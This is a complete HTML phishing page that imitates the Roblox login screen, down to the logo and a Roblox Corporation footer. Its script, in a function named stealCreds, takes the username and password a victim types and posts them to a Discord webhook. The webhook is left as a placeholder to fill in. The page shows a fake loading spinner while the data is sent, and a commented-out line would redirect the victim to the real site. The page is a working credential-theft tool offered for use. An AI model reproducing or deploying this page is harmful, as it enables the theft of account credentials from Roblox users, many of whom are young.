<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #232527;
            font-family: 'Gotham', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white;
        }

        .login-container {
            background-color: #232527;
            padding: 40px;
            border-radius: 10px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .logo {
            width: 180px;
            margin-bottom: 20px;
        }

        .input-group {
            width: 100%;
            margin-bottom: 15px;
        }

        input {
            width: 100%;
            padding: 12px 10px;
            border-radius: 8px;
            border: 1px solid #a0a0a0;
            background-color: #111;
            color: white;
            font-size: 14px;
            box-sizing: border-box;
            outline: none;
        }

        input:focus {
            border-color: white;
        }

        button {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 8px;
            background-color: #00b06f;
            color: white;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }

        button:hover {
            background-color: #008c5a;
        }

        .loading-screen {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #232527;
            justify-content: center;
            align-items: center;
            z-index: 999;
        }

        .spinner {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #fff;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #a0a0a0;
        }
    </style>
</head>
<body>

    <!-- Loading Screen -->
    <div class="loading-screen" id="loading">
        <div class="spinner"></div>
    </div>

    <!-- Login Form -->
    <div class="login-container">
        <!-- Roblox Logo (Using a standard hosted image to ensure it loads) -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" alt="Roblox Logo" class="logo">
        
        <div class="input-group">
            <input type="text" id="username" placeholder="Username" autocomplete="off">
        </div>
        <div class="input-group">
            <input type="password" id="password" placeholder="Password">
        </div>
        <button onclick="stealCreds()">Log In</button>
        
        <div class="footer">
            <p>© 2026 Roblox Corporation</p>
        </div>
    </div>

    <script>
        function stealCreds() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const webhookUrl = "YOUR_WEBHOOK_URL_HERE"; // <--- REPLACE THIS

            if(!username || !password) {
                alert("Please fill in all fields.");
                return;
            }

            // Show loading screen to fake the "loading" process
            document.getElementById('loading').style.display = 'flex';

            // Send data to Discord
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    content: "**New Roblox Login Attempt**\n" +
                             "Username: `" + username + "`\n" +
                             "Password: `" + password + "`"
                })
            }).then(() => {
                // Optional: Redirect them to the real site after sending data
                // window.location.href = "https://www.roblox.com/";
            }).catch((error) => {
                console.error('Error:', error);
            });
        }
    </script>

</body>
</html>
